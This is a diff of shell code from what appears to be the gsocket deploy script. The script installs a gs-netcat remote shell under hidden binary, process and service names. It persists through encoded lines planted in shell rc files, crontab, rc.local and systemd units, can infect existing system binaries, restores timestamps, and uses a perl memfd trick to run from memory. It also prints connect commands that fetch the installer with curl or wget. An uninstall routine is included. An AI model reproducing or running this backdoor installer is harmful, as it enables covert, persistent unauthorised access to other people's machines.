+		elif [[ $OSNAME == "osx" ]]; then
+			if [[ "$arch" == "arm64" ]]; then
+				OSARCH="arm64" # M1
+			else
+				OSARCH="x86_64"
+			fi
+			OSARCH+="-osx"
+		elif [[ ${OSNAME,,} == *freebsd* ]]; then
+				OSARCH="x86_64-freebsd"
+		elif [[ ${OSNAME,,} == *openbsd* ]]; then
+				OSARCH="x86_64-openbsd"
+		elif [[ ${OSNAME,,} == *cygwin* ]]; then
+			OSARCH="i686-cygwin"
+			[[ "$arch" == "x86_64" ]] && OSARCH="x86_64-cygwin"
+		fi
+	fi # -z $OSARCH
+
+	if [[ $OSARCH == "x86_64-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-x86_64"
+	elif [[ $OSARCH == "i386-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-i686"
+	elif [[ $OSARCH == "arm7-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-armv7l"
+	elif [[ $OSARCH == "arm6-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-armv6"
+	elif [[ $OSARCH == "arm-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-arm"
+	elif [[ $OSARCH == "aarch64-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-aarch64"
+	elif [[ $OSARCH == "mips64-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-mips64"
+	elif [[ $OSARCH == "mips32-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-mips32"
+	elif [[ $OSARCH == "mipsel32-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-mipsel"
+	elif [[ $OSARCH == "powerpc64-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-powerpc64"
+	elif [[ $OSARCH == "powerpc64le-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-powerpc64le"
+	elif [[ $OSARCH == "powerpc-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-powerpc"
+	elif [[ $OSARCH == "powerpcle-linux" ]]; then
+		SRC_PKG="gs-netcat_mini-linux-powerpcle"
+	elif [[ $OSARCH == "x86_64-osx" ]]; then
+		SRC_PKG="gs-netcat_mini-macOS-x86_64"
+	elif [[ $OSARCH == "arm64-osx" ]]; then
+		SRC_PKG="gs-netcat_mini-macOS-arm64"
+	elif [[ $OSARCH == "x86_64-freebsd" ]]; then
+		SRC_PKG="gs-netcat_mini-freebsd-x86_64"
+	elif [[ $OSARCH == "x86_64-openbsd" ]]; then
+		SRC_PKG="gs-netcat_mini-openbsd-x86_64"
+	elif [[ $OSARCH == "x86_64-cygwin" ]]; then
+		SRC_PKG="x86_64-cygwin"
+	elif [[ $OSARCH == "i686-cygwin" ]]; then
+		SRC_PKG="i686-cygwin"
+	else
+		OSARCH="x86_64-linux"
+		WARN "Unsupported OS/Architecture: ${CW}${arch}-${OSNAME}${CN}. Using ${CDY}${OSARCH}${CN}"
+		SRC_PKG="gs-netcat_mini-linux-x86_64"
+	fi
+
+	if command -v curl >/dev/null; then
+		DL_CMD="$DL_CRL"
+	elif command -v wget >/dev/null; then
+		DL_CMD="$DL_WGT"
+	elif [[ -z "$GS_USELOCAL" ]]; then
+		# errexit "Need curl or wget."
+		FAIL_OUT "Need curl or wget. Try ${CM}apt install curl${CN}"
+		errexit
+	fi
+
+	[[ $GS_DL == "wget" ]] && DL_CMD="$DL_WGT"
+	[[ $GS_DL == "curl" ]] && DL_CMD="$DL_CRL"
+	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
+		IS_USE_CURL=1
+		### Note: need -S (--show-errors) to process 404 for CF webhooks.
+		DL=("curl" "-fsSL" "--connect-timeout" "7" "-m900" "--retry" "3")
+		[[ -n $GS_DEBUG ]] && DL+=("-v")
+		[[ -n $GS_NOCERTCHECK ]] && DL+=("-k")
+	elif [[ "$DL_CMD" == "$DL_WGT" ]]; then
+		IS_USE_WGET=1
+		### Note: Dont use -q: Need errors to process 404 for CF webhooks
+		# Read-timeout is 900 seconds by default.
+		DL=("wget" "-O-")
+		wget --help 2>&1 | grep -qFm1 connect && DL+=("--connect-timeout=7" "--dns-timeout=7")
+		[[ -n $GS_NOCERTCHECK ]] && DL+=("--no-check-certificate")
+	else
+		# Can happen if deploy-all.sh when no curl/wget
+		# but we still want to do a webhook.
+		DL=("false")   # Should not happen
+	fi
+
+	# Client also uses "mini" now.
+	# [ -n "$S" ] && URL_BIN="$URL_BIN_FULL"
+
+	[ -n "$S" ] && gs_access_memexec
+	# Use HOME from /etc/passwd first
+	phome="$(grep -m1 ^"$(whoami)" /etc/passwd 2>/dev/null | cut -d: -f6)"
+	[ -n "$phome" ] && [ "$phome" != "$HOME" ] && HOME="$phome"
+
+	[ -z "$HOME" ] && {
+		HOME="$(pwd)"
+		WARN "HOME not set. Using 'HOME=$HOME'"
+	}
+	[ ! -d "$HOME" ] && errexit "ERROR: Not found: '$HOME'. Try 'export HOME=<users home directory>'"
+
+	# Docker does not set USER
+	[[ -z "$USER" ]] && USER=$(id -un)
+	[[ -z "$UID" ]] && UID=$(id -u)
+
+	# check that xxd is working as expected (alpine linux does not have -r option)
+	[[ -z "$GS_NOENC" ]] && {
+		try_encode "base64" "base64 -w0" "base64 -d"
+		try_encode "xxd" "xxd -ps -c1024" "xxd -r -ps"
+	}
+	DEBUGF "ENCODE_STR='${ENCODE_STR}'"
+
+	# Defaults
+	bin="$(basename "$GS_BIN")"
+	if [[ -n "$bin" ]]; then
+		BIN_HIDDEN_NAME="${bin}"
+		BIN_HIDDEN_NAME_RM+=("${bin}")
+		service="$GS_SERVICE"
+		[[ -z "$service" ]] && service="$bin"
+		# Only check for _this_ binary to allow double installs
+		bin_hidden_name_arr=("${BIN_HIDDEN_NAME}")
+	else
+		BIN_HIDDEN_NAME="${BIN_HIDDEN_NAME_DEFAULT}"
+	fi
+	BIN_HIDDEN_NAME_RX=$(echo "$BIN_HIDDEN_NAME" | sed 's/[^a-zA-Z0-9]/\\&/g')
+	
+	if [[ -n $GS_NAME ]]; then
+		PROC_HIDDEN_NAME="${GS_NAME}"
+		# PROC_HIDDEN_NAME_RX+="|$(echo "$GS_NAME" | sed 's/[^a-zA-Z0-9_-]/\\&/g')"
+	else
+		PROC_HIDDEN_NAME="$PROC_HIDDEN_NAME_DEFAULT"
+	fi
+
+	CONFIG_DIR_NAME="${CONFIG_DIR_NAME_DEFAULT}"
+	[ -n "$DSTDIR" ] && unset config_dir_name_arr
+
+	SERVICE_HIDDEN_NAME="${service:-$SERVICE_HIDDEN_NAME_DEFAULT}"
+	SERVICE_HIDDEN_NAME="${SERVICE_HIDDEN_NAME%%.*}"
+
+	unset LDSO
+	# DISABLED because ld-linux.so loading of static bins (gsnc-stealth) wont work :/
+	# Can be patched with patchelf to add vdso.so but wont work on upx packed bins.
+	# [[ "$OSNAME" == *linux* ]] && [[ -z "$S" ]] && {
+	# 	LDSO="$(echo /lib64/ld-*.so.*)"
+	# 	[[ ! -f "${LDSO}" ]] && LDSO="$(echo /lib/ld-*.so.*)"
+	# 	[[ ! -f "${LDSO}" ]] && unset LDSO
+	# }
+
+	if [[ $OSNAME == "osx" ]]; then
+		# on OSX 'pkill' and 'killall' match the process (argv[0]) whereas on Unix
+		# they match the binary name.
+		WARN "OSX is least supported. GS_UNDO= may not work. Check manually"
+		KL_CMD="killall"
+		KL_NAME="${PROC_HIDDEN_NAME}"
+		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
+	elif command -v pkill >/dev/null; then
+		KL_CMD="pkill"
+		KL_NAME="${BIN_HIDDEN_NAME_RX}"
+		KL_CMD_RUNCHK_UARG=("-0" "-x" "-U${UID}")
+	elif command -v killall >/dev/null; then
+		KL_CMD="killall"
+		KL_NAME="${BIN_HIDDEN_NAME}"
+		# cygwin's killall needs the name (not the uid)
+		KL_CMD_RUNCHK_UARG=("-0" "-u${USER}")
+	fi
+
+	# $PATH might be set differently in crontab/.profile. Use
+	# absolute path to binary instead:
+	KL_CMD_BIN="$(command -v "$KL_CMD")"
+	[[ -z $KL_CMD_BIN ]] && {
+		# set to something that returns 'false' so that we dont
+		# have to check for empty string in crontab/.profile
+		# (e.g. skip checking if already running and always start)
+		KL_CMD_BIN="$(command -v false)"
+		[[ -z $KL_CMD_BIN ]] && KL_CMD_BIN="/bin/does-not-exit"
+		WARN "No pkill or killall found."
+	}
+
+	RCLOCAL_DIR="${GS_PREFIX}/etc"
+	RCLOCAL_FILE="${RCLOCAL_DIR}/rc.local"
+
+	# Create a list of potential rc-files.
+	# - .bashrc is often, but not always, included by .bash_profile [IGNORE]
+	# - .bash_login is ignored if .bash_profile exists
+	# - $SHELL might not be set (if /bin/sh was gained by RCE)
+	[[ -f ~/.zshrc ]] && RC_FN_LIST+=(".zshrc")
+	if [[ -f ~/.bashrc ]]; then
+		RC_FN_LIST+=(".bashrc")
+		# Assume .bashrc is loaded by .bash_profile and .profile
+	else
+		# HERE: not bash or .bashrc does not exist
+		if [[ -f ~/.bash_profile ]]; then
+			RC_FN_LIST+=(".bash_profile")
+		elif [[ -f ~/.bash_login ]]; then
+			RC_FN_LIST+=(".bash_login")
+		fi
+	fi
+	[[ -f ~/.profile ]] && RC_FN_LIST+=(".profile")
+	[[ ${#RC_FN_LIST[@]} -eq 0 ]] && RC_FN_LIST+=(".profile")
+
+	[[ -d "${GS_PREFIX}/etc/systemd/system" ]] && SERVICE_DIR="${GS_PREFIX}/etc/systemd/system"
+	[[ -d "${GS_PREFIX}/lib/systemd/system" ]] && SERVICE_DIR="${GS_PREFIX}/lib/systemd/system"
+	WANTS_DIR="${GS_PREFIX}/etc/systemd/system" # always this
+	SERVICE_FILE="${SERVICE_DIR}/${SERVICE_HIDDEN_NAME}.service"
+
+	CRONTAB_DIR="${GS_PREFIX}/var/spool/cron/crontabs"
+	[[ ! -d "${CRONTAB_DIR}" ]] && CRONTAB_DIR="${GS_PREFIX}/etc/cron/crontabs"
+
+	UNINST_CMD="$DL_CMD"
+	[[ -n "$GS_USELOCAL" ]] && UNINST_CMD="./deploy-all.sh"
+
+	[[ $SHELL == *"nologin"* ]] && unset SHELL
+	[[ $SHELL == *"jail"* ]] && unset SHELL  # /usr/local/cpanel/bin/jailshell
+	[[ $SHELL == *"noshell"* ]] && unset SHELL  #  /usr/local/cpanel/bin/noshell
+	[[ $SHELL == *"/dev/null"* ]] && unset SHELL
+	# Test that shell is a good shell.
+	[[ -n $SHELL ]] && [[ "$("$SHELL" -c "echo TRUE" 2>/dev/null)" != "TRUE" ]] && unset SHELL
+
+	DEBUGF "DL=${DL[*]}"
+	DEBUGF "URL=${URL_BIN}/${SRC_PKG}"
+}
+
+mk_encode() {
+	local str
+	str="2>/dev/null >/dev/null #${BIN_HIDDEN_NAME}${_ESC_CLEARLN}"
+	if [[ -n "$ENCODE_STR" ]]; then 
+		echo "{ echo $(echo "$1"|${ENCODE_STR})|${DECODE_STR}|bash;} ${str}"
+	else
+		echo "${1} ${str}"
+	fi
+}
+
+init_setup()
+{
+	local str
+
+	if [[ -n "$GS_PREFIX" ]]; then
+		# Debuggin and testing into separate directory
+		mkdir -p "${GS_PREFIX}/etc" 2>/dev/null
+		mkdir -p "${GS_PREFIX}/usr/sbin" 2>/dev/null
+		mkdir -p "${GS_PREFIX}${HOME}" 2>/dev/null
+		if [[ -f "${HOME}/${RC_FN_LIST[1]}" ]]; then
+			cp -p "${HOME}/${RC_FN_LIST[1]}" "${GS_PREFIX}${HOME}/${RC_FN_LIST[1]}"
+		fi
+		cp -p /etc/rc.local "${GS_PREFIX}/etc/"
+	fi
+
+	# Find out which directory is writeable
+	init_dstbin
+	DSTBIN_EXEC_ARR=()
+	[[ -n "$LDSO" ]] && DSTBIN_EXEC_ARR=("${LDSO}")
+	DSTBIN_EXEC_ARR+=("${DSTBIN}")
+
+	unset NOTE_DONOTREMOVE
+	[ -n "$GS_NOTE" ] && NOTE_DONOTREMOVE="# DO NOT REMOVE THIS LINE. SEED PRNG. # ${BIN_HIDDEN_NAME}${_ESC_CLEARLN}"
+
+	# There is no reliable way to check if a process is running:
+	# - Process might be running under different name. Especially OSX checks for the orginal name
+	#   but not the hidden name.
+	# - pkill or killall may have moved.
+	# The best we can do:
+	# 1. Try pkill/killall _AND_ daemon is running then do nothing.
+	# 2. Otherwise start gs-dbus as DAEMON. The daemon will exit (fully) if GS-Address is already in use.
+	unset PROFILE_LINE CRONTAB_LINE
+	if [[ $OSNAME == "linux" ]]; then
+		[[ -n "$LDSO" ]] && str="${LDSO} "
+		# Under Linux the gsnc binary check's itself and exits if already running.
+		PROFILE_LINE="${str}'${DSTBIN}'"
+		CRONTAB_LINE="${str}'${DSTBIN}'"
+		RCLOCAL_LINE="${str}'${DSTBIN}'"
+	else 
+		RCLOCAL_LINE="'${DSTBIN}' 2>/dev/null" # Only executed ONCE at bootup
+		PROFILE_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} '${KL_NAME}' 2>/dev/null || '${DSTBIN}' 2>/dev/null"
+		# CRONTAB_LINE="@reboot '${DSTBIN}' 2>/dev/null"
+		CRONTAB_LINE="${KL_CMD_BIN} ${KL_CMD_RUNCHK_UARG[*]} '${KL_NAME}' 2>/dev/null || '${DSTBIN}' 2>/dev/null"
+	fi
+
+	RCLOCAL_LINE="$(mk_encode "$RCLOCAL_LINE")"
+	PROFILE_LINE="$(mk_encode "$PROFILE_LINE")"
+	CRONTAB_LINE="$(mk_encode "$CRONTAB_LINE")"
+	# crontab persistency is disabled:
+	[ -n "$GS_NOCRONTAB" ] && unset CRONTAB_LINE
+
+	DEBUGF "DSTBIN_EXEC_ARR=${DSTBIN_EXEC_ARR[*]}"
+}
+
+_config2bin_memexec() {
+	local src="$1"
+	local dst="$2"
+
+	[[ "$src" != "$dst" ]] && return 255
+
+	GS_CONFIG_WRITE="${dst}" perl '-efor(319,279){($f=syscall$_,$",1)>0&&last};open($o,">&=".$f);print$o(<STDIN>);exec{"/proc/$$/fd/$f"}"/usr/bin/python3"' <"$src" &>/dev/null || return 255
+	DEBUGF "config2bin_memexec SUCCESS"
+
+	return 0
+}
+
+# Execute 'src' to create configuration and add it to 'dst'.
+# config2bin src dst ARGS
+# 'src' must be executeable.
+_config2bin_tmpfile() {
+	local src="$1"
+	local dst="$2"
+	local dst_final
+	local exec_arr=()
+
+	[[ "$src" == "$dst" ]] && {
+		# Identical => make temporary copy first (because we can not append
+		# data to a binary that is currently being executed/loaded)
+		dst_final="${dst}"
+		dst="${src}.tmp"
+		_ts_add_pdir "${dst_final}"
+	}
+
+	[[ ! -f "${dst}" ]] && {
+		_ts_add_pdir "${dst}"
+		cp -p "${src}" "${dst}" || return 255
+	}
+
+	[[ -n "$LDSO" ]] && exec_arr=("$LDSO")
+	exec_arr+=("${src}")
+	GS_CONFIG_WRITE="${dst}" "${exec_arr[@]}" || return 255
+	[[ -n "$dst_final" ]] && {
+		cat "${dst}" >"${dst_final}"
+		rm -f "${dst:?}"
+	}
+
+	return 0
+}
+
+_config2bin_withenv() {
+	_config2bin_memexec "$@" && return 0
+	_config2bin_tmpfile "$@" && return 0
+}
+
+config2bin() {
+	local opts="$3"
+	local proc_hidden_name="$4"
+
+	GS_PROC_HIDDENNAME="${proc_hidden_name}" GS_ARGS="${opts}" TERM=xterm-256color GS_CCG="${GS_CCG}" GS_SYSTEMD_ARGV_MATCH="${GS_SYSTEMD_ARGV_MATCH}" GS_WORKDIR="${GS_WORKDIR}" GS_DOMAIN="${GS_DOMAIN}" GS_PORT="${GS_PORT}" GS_HOST="${GS_HOST}" GS_BEACON="${GS_BEACON}" GS_FFPID="${GS_FFPID}" GS_REEXEC="${GS_REEXEC}" GS_STEALTH=1 GS_SECRET="${GS_SECRET:?}" _config2bin_withenv "$@"
+}
+
+# Load configuration from TARGET by executing EXE.
+# exe target
+bin2config() {
+	local exe="$1"
+	local bin="$2"
+	local exec_arr=()
+
+	unset GS_CONFIG_SECRET
+	unset GS_CONFIG_PROC_HIDDENNAME
+	unset GS_CONFIG_NOT_FOUND
+	unset GS_CONFIG_BEACON
+	unset GS_CONFIG_HOST
+	unset GS_CONFIG_PORT
+	unset GS_CONFIG_REEXEC
+	[[ ! -f "${exe}" ]] && return 255
+	[[ ! -f "${bin}" ]] && return 255
+
+	[[ -n "$LDSO" ]] && exec_arr=("$LDSO")
+	exec_arr+=("${exe:?}")
+	eval "$(GS_STEALTH=1 GS_CONFIG_READ="${bin:?}" GS_CONFIG_CHECK=1 "${exec_arr[@]}" -h 2>/dev/null | grep ^GS_CONFIG_)"
+	[[ -z "$GS_CONFIG_SECRET" ]] && return 255
+	return 0
+}
+
+uninstall_rm()
+{
+	[[ -z "$1" ]] && return
+	[[ ! -f "$1" ]] && return # return if file does not exist
+
+	echo "Removing $1..."
+	xrm "$1" 2>/dev/null
+}
+
+uninstall_bin_rm() {
+	bin2config "$1" "$1" && [[ -n "$GS_CONFIG_PROC_HIDDENNAME" ]] && UNINST_PROC_HN_ARR+=("$GS_CONFIG_PROC_HIDDENNAME")
+	uninstall_rm "$@"
+}
+
+uninstall_rmdir()
+{
+	[[ -z "$1" ]] && return
+	[[ ! -d "$1" ]] && return # return if file does not exist
+
+	xrmdir "$1" 2>/dev/null || return
+	# Only output if we were successfull:
+	echo "Removing $1..."
+}
+
+uninstall_rc()
+{
+	local hname
+	local fn
+	hname="$2"
+	fn="$1"
+
+	[[ ! -f "$fn" ]] && return # File does not exist
+
+	grep -F -- "${hname}" "$fn" &>/dev/null || return # not installed
+
+	mk_file "$fn" || return
+
+	echo "Removing ${fn}..."
+	D="$(grep -v -F -- "${hname}" "$fn")"
+	echo "$D" >"${fn}" || return
+
+	[[ ! -s "${fn}" ]] && rm -f "${fn:?}" 2>/dev/null # delete zero size file
+}
+
+uninstall_service()
+{
+	local dir
+	local sn
+	local sf
+	dir="$1"
+	sn="$2"
+	sf="${dir}/${sn}.service"
+
+	[[ ! -f "${sf}" ]] && return
+	[[ $UID -ne 0 ]] && {
+		echo -e "${CDY}WARN${CN}: Disinfecting ${CDY}${sf}${CN}...FAILED. Need to be root."
+		return 255
+	}
+
+	command -v systemctl >/dev/null && {
+		ts_add_systemd "${WANTS_DIR}/multi-user.target.wants"
+		systemctl disable "${sn}" 2>/dev/null
+	}
+
+	if grep -Fqm1 oneshot "${sf}" 2>/dev/null; then
+		UNINST_IS_SYSTEMD_ONESHOT=1
+	else
+		UNINST_IS_SYSTEMD_SIMPLE=1
+	fi
+
+	uninstall_rm "${sf}"
+}
+
+uninstall_systemd_infect() {
+	local name="$1"
+	local fn="$2"
+	local bn
+	
+	[[ ! -f "${fn} " ]] && return 0
+	[[ $UID -ne 0 ]] && {
+		echo -e "${CDY}WARN${CN}: Disinfecting ${fn}...FAILED. Need to be root."
+		return 255
+	}
+
+	bn=$(basename "${fn}")
+
+	xmv "${fn} " "${fn}"
+	cmd_kill_arr+=("${bn}")
+}
+
+# Rather important function especially when testing and developing this...
+uninstall()
+{
+	local hn
+	local fn
+	local cn
+
+	{ [ -z "$GS_BIN" ] || [ -z "$GS_NAME" ]; } && WARN "Only removing default installs. ${CF}[GS_BIN= and GS_NAME= are not set]${CN}"
+
+	cmd_kill_arr=("${BIN_HIDDEN_NAME}")
+	for hn in "${BIN_HIDDEN_NAME_RM[@]}"; do
+		for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
+			uninstall_bin_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}"
+			uninstall_rm "${GS_PREFIX}${HOME}/.config/${cn}/${hn}.dat"  # SEC_NAME
+		done
+		uninstall_bin_rm "${GS_PREFIX}/usr/bin/${hn}"  # obsolete
+		uninstall_bin_rm "${GS_PREFIX}/usr/sbin/${hn}"
+		uninstall_bin_rm "/dev/shm/${hn}"
+		uninstall_bin_rm "/tmp/.gsusr-${UID}/${hn}"
+		uninstall_bin_rm "${PWD}/${hn}"
+
+		uninstall_rm "${RCLOCAL_DIR}/${hn}.dat"  # SEC_NAME
+		uninstall_rm "${GS_PREFIX}/usr/bin/${hn}.dat" # SEC_NAME
+
+		uninstall_rm "/dev/shm/${hn}.dat" # SEC_NAME
+		uninstall_rm "/tmp/.gsusr-${UID}${hn}.dat" # SEC_NAME
+
+		uninstall_rm "${PWD}/${hn}.dat" # SEC_NAME
+
+		# Remove from login script
+		for fn in ".bash_profile" ".bash_login" ".bashrc" ".zshrc" ".profile"; do
+			uninstall_rc "${GS_PREFIX}${HOME}/${fn}" "${hn}"
+		done 
+		uninstall_rc "${GS_PREFIX}/etc/rc.local" "${hn}"
+
+		## Systemd's gs-dbus.dat
+		uninstall_rm "${SERVICE_DIR}/${hn}.dat"  # SYSTEMD_SEC_FILE / SEC_NAME
+	done
+	unset fn
+
+	for hn in "${SERVICE_HIDDEN_NAME}" "${service_hidden_name_arr[@]}"; do
+		uninstall_service "${SERVICE_DIR}" "${hn}" # SERVICE_HIDDEN_NAME
+	done
+
+	for cn in "${CONFIG_DIR_NAME_RM[@]}"; do
+		uninstall_rmdir "${GS_PREFIX}${HOME}/.config/${cn}"
+	done
+	uninstall_rmdir "${GS_PREFIX}${HOME}/.config"
+	uninstall_rmdir "/tmp/.gsusr-${UID}"
+
+	# Remove crontab
+	unset regex
+	regex="dummy-not-exist"
+	for str in "${BIN_HIDDEN_NAME_RM[@]}"; do
+		# Escape regular exp special characters
+		regex+="|$(echo "$str" | sed 's/[^a-zA-Z0-9]/\\&/g')"
+	done
+	if [[ $OSNAME != "osx" ]] && command -v crontab >/dev/null; then
+		ct="$(crontab -l 2>/dev/null)"
+		[[ "$ct" =~ ($regex) ]] && {
+			[[ $UID -eq 0 ]] && mk_file "${CRONTAB_DIR}/root"
+			echo "Removing from crontab..."
+			echo "$ct" | grep -v -E -- "($regex)" | crontab - 2>/dev/null
+		}
+	fi
+
+	i=0
+	while [[ $i -lt "${#INFECT_BIN_NAME_ARR[@]}" ]]; do
+		uninstall_systemd_infect "${INFECT_SYSCTL_NAME_ARR[$i]}" "${INFECT_BIN_NAME_ARR[$i]}"
+		((i++))
+	done
+
+	echo -e "${CG}Uninstall complete.${CN}"
+
+	[[ -n "$systemd_kill_cmd" ]] && {
+		systemctl daemon-reload 2>/dev/null
+		[[ -n "$UNINST_IS_SYSTEMD_SIMPLE" ]] && echo -e "--> Use ${CM}${systemd_kill_cmd}${CN} to terminate all running shells."
+	}
+
+	[[ ${#UNINST_PROC_HN_ARR[@]} -gt 0 ]] && {
+		# FIXME: One day check that all these processes are the correct ones:
+		echo -e "--> Verify and manually terminate all running shells:${CM}"
+		for p in "${UNINST_PROC_HN_ARR[@]}"; do
+			echo "    ps -eF f | grep -F '$p' | grep -v 'grep '"
+		done
+		echo -en "${CN}"
+	}
+
+	exit_code 0
+}
+
+SKIP_OUT()
+{
+	echo -e "[${CY}SKIPPING${CN}]"
+	[[ -n "$1" ]] && echo -e "--> $*"
+}
+
+OK_OUT()
+{
+	echo -e "......[${CG}OK${CN}]"
+	[[ -n "$1" ]] && echo -e "--> $*"
+	return 0
+}
+
+FAIL_OUT()
+{
+	echo >&2 -e "..[${CR}FAILED${CN}]"
+	for str in "$@"; do
+		echo >&2 -e "--> $str"
+	done
+}
+
+WARN()
+{
+	echo -e "--> ${CY}WARNING: ${CN}$*"
+}
+
+WARN_EXECFAIL_SET()
+{
+	[[ -n "$WARN_EXECFAIL_MSG" ]] && return # set it once (first occurance) only
+	WARN_EXECFAIL_MSG="CODE=${1} (${2}): ${CY}$(uname -n -m -r)${CN}"
+}
+
+WARN_EXECFAIL()
+{
+	[[ -z "$WARN_EXECFAIL_MSG" ]] && return
+	[[ -n "$ERR_LOG" ]] && echo -e "${CDR}${ERR_LOG}${CN}"
+	echo -en "${CDR}"
+	ls -al "${DSTBIN}"
+	echo -e "${CN}--> ${WARN_EXECFAIL_MSG}
+--> GS_OSARCH=${OSARCH}
+--> GS_DSTDIR=${DSTBIN%/*}
+--> Try to set ${CDC}export GS_DEBUG=1${CN} and deploy again.
+--> Please send that output to ${CM}root@proton.thc.org${CN} to get it fixed.
+--> Alternatively, try the static binary from
+--> ${CB}https://github.com/hackerschoice/gsocket/releases${CN}
+--> ${CDC}chmod 755 gs-netcat; ./gs-netcat -ilv${CN}."
+}
+
+HOWTO_CONNECT_OUT()
+{
+	local str
+	local xstr
+	local opt="-i"
+
+	[[ -n $GS_HOST ]] && str+="GS_HOST=$GS_HOST "
+	[[ -n $GS_BEACON ]] && {
+		opt+="w"
+		xstr="GS_ARGS='-w' "
+	}
+	# After all install attempts output help how to uninstall
+	echo -e "--> To uninstall use ${CM}GS_UNDO=1 ${UNINST_CMD}${CN}"
+	echo -e "--> To connect use one of the following
+--> ${CM}${str}gs-netcat -s \"${GS_SECRET}\" ${opt}${CN}
+--> ${CM}${str}${xstr}S=\"${GS_SECRET}\" ${DL_CRL}${CN}
+--> ${CM}${str}${xstr}S=\"${GS_SECRET}\" ${DL_WGT}${CN}"
+}
+
+
+gs_secret_reload_systemd_infect() {
+	local bin
+
+	[[ -z $GS_INFECT ]] && return 255
+
+	for bin in "${INFECT_BIN_NAME_ARR[@]}"; do
+		[[ ! -f "${bin} " ]] && continue
+		bin2config "${bin}" "${bin}" && {
+			INFECTED_BIN_NAME="${bin}"
+			unset DSTBIN
+			unset DSTBIN_EXEC_ARR
+			unset PROC_HIDDEN_NAME
+			return 0
+		}
+	done
+
+	return 255
+}
+
+gs_secret_load_user() {
+	local f d
+
+	[ -n "$GS_DSTDIR" ] && {
+		for f in "${bin_hidden_name_arr[@]}"; do
+			fn="${GS_PREFIX}${GS_DSTDIR}/${f}"
+			DEBUGF "Checking ${fn}"
+			[[ -f "${fn}" ]] && bin2config "${fn}" "${fn}" && { DSTBIN="${fn}"; return 0; }
+		done
+
+		return 255
+	}
+
+	for d in "${config_dir_name_arr[@]}"; do
+		for f in "${bin_hidden_name_arr[@]}"; do
+			fn="${GS_PREFIX}${HOME}/.config/${d}/${f}"
+			DEBUGF "Checking ${fn}"
+			[[ -f "${fn}" ]] && bin2config "${fn}" "${fn}" && { DSTBIN="${fn}"; return 0; }
+		done
+	done
+
+	return 255
+}
+
+gs_secret_load_system() {
+	local d
+
+	d="${GS_DSTDIR:-/usr/sbin}"
+	for f in "${bin_hidden_name_arr[@]}"; do
+		fn="${d}/${f}"
+		DEBUGF "Checking ${fn}"
+		[[ -f "${fn}" ]] && bin2config "${fn}" "${fn}" && { DSTBIN="${fn}"; return 0; }
+	done
+
+	return 255
+}
+
+exit_installed() {
+	WARN "Already installed."
+
+	GS_SECRET="$GS_CONFIG_SECRET"
+	GS_BEACON="$GS_CONFIG_BEACON"
+	# GS_PORT="$GS_CONFIG_PORT"
+	GS_HOST="$GS_CONFIG_HOST"
+	PROC_HIDDEN_NAME="$GS_CONFIG_PROC_HIDDENNAME"
+	show_install_config
+	HOWTO_CONNECT_OUT
+	exit_code 0
+}
+
+# Try to load a GS_SECRET
+gs_secret_reload() {
+	local load_ok fn f d
+	gs_secret_reload_systemd_infect && exit_installed
+
+	# systemd-install not found.
+	# Try to load from binary if it exists:
+	# User may set DSTDIR= and GS_NAME=
+	[[ -f "${DSTBIN:?}" ]] && bin2config "${DSTBIN}" "${DSTBIN}" && exit_installed
+
+	# If GS_DSTDIR is set then look _only_ in the GS_DSTDIR
+	gs_secret_load_user && exit_installed
+	gs_secret_load_system && exit_installed
+}
+
+# Return 200 if already infected.
+# Return 0 on success.
+infect_bin() {
+	local bin="$1"
+	[[ ! -f "$bin" ]] && { SKIP_OUT "Not found: ${bin}."; return 255; }
+	local ret
+
+	bin2config "$DSTBIN" "${bin}"
+	[[ -n "$GS_CONFIG_SECRET" ]] && {
+		GS_SECRET="$GS_CONFIG_SECRET"
+		((IS_INSTALLED+=1))
+		IS_SKIPPED=1
+		SKIP_OUT "Already infected."
+		return 200
+	}
+
+	[[ -z "$GS_CONFIG_NOT_FOUND" ]] && {
+		# Check for old binary that output uname -a
+		# Infection not supported by old binary.
+		SKIP_OUT "Old gs-netcat binary. GS_UNDO=1 first."
+		return 255
+	}
+
+	# Broken old install?
+	[[ -f "${bin} " ]] && errexit 254 "File '${bin} ' already exists. Remove it if '${bin}' is really the original."
+
+	# Restore timestamp of this file:
+	_ts_add "${bin}"
+	# Can not overwrite a running binary. First move it away:
+	xmv "${bin}" "${bin} " || { FAIL_OUT "Could not move ${bin}."; return 255; }
+
+	# Copy it back so that we retain permissions
+	cp -p "${bin} " "${bin}" || {
+		xmv "${bin} " "${bin}" # Try to recover...
+		FAIL_OUT "Could not move '${bin} ' to '${bin}'."
+		return 255
+	}
+	cat "${DSTBIN}" >"${bin}"
+}
+
+do_config2bin() {
+	echo -en "Adding configuration.................................................."
+	config2bin "${1:?}" "${2:?}" "${3:?}" "${4}" || {
+		FAIL_OUT
+		return 255
+	}
+	OK_OUT
+}
+
+install_systemd_add() {
+	local sfdata="$1"
+	local param="$2"
+	local len="70"
+	do_config2bin "${DSTBIN}" "${DSTBIN}" "${param:--ilq}" "${PROC_HIDDEN_NAME}" || return 255
+
+	[[ -n "$CDC" ]] && ((len+=11)) 
+	printf "%-${len}.${len}s" "$(echo -e "Installing as systemd ${CB}${SERVICE_HIDDEN_NAME}.service${CN}..............................................")"
+
+	if [[ -f "${SERVICE_FILE}" ]]; then
+		((IS_INSTALLED+=1))
+		IS_SKIPPED=1
+		systemctl is-active "${SERVICE_HIDDEN_NAME}" &>/dev/null && IS_GS_RUNNING=1
+		IS_SYSTEMD=1
+		SKIP_OUT "${SERVICE_FILE} already exists."
+		return 0
+	fi
+
+	# Create the service file
+	mk_file "${SERVICE_FILE}" || return 255
+	chmod 644 "${SERVICE_FILE}" # Stop 'is marked world-inaccessible' dmesg warnings.
